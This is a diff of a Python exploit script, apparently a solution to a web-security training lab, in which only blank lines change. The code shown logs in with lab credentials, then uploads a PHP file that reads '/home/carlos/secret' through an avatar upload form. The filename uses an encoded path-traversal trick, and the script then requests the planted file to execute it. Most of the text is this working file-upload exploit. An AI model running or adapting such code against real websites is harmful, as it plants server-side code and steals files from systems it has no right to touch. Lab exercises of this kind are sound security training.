@@ -9,7 +9,6 @@ import argparse
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 def get_csrf_token():
-    
     # CSRF token
     url = target_url + "/login"
     out = r.get(url, verify = False, proxies = proxies)
@@ -25,15 +24,12 @@ def get_csrf_token():
     return csrf_token
 
 def login(csrf_token, username = "wiener", password = "peter"):
-
     url = target_url + "/login"
-
     data = {
         'csrf':csrf_token,
         'username':username,
         'password':password
     }
-
     headers = {
         'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0'
     }
@@ -56,13 +52,10 @@ def login(csrf_token, username = "wiener", password = "peter"):
         sys.exit(0)
 
 def upload_file(csrf_token):
-
     url = target_url + "/my-account/avatar"
-
     # file = {
     #     'name': ('file_name.php', 'file_content', 'Content-Type')
     # }
-
     file = {
         'avatar': ('..%2Ffile_upload.php', '<?php echo file_get_contents("/home/carlos/secret") ?>','text/php'),
         'user': (None, 'wiener', None),
@@ -79,7 +72,6 @@ def upload_file(csrf_token):
     
     # Execute the file by the get request
     url = target_url + "/files/file_upload.php"
-
     out = r.get(url, verify=False, proxies=proxies)
     if out.status_code == 200:
         print("[+] Exploited by requesting uploaded malicious file")
